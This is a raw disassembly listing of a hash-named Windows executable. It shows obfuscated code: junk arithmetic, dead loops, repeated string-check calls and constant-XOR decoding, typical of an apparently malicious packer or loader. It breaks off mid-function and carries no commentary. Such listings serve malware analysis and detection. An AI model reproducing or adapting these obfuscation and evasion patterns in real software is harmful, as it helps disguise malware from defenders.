
8922a159e9e62f097ccaadc8e55c7403d03ca9cbbdb3a4cbedc5ebb4caa32583.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
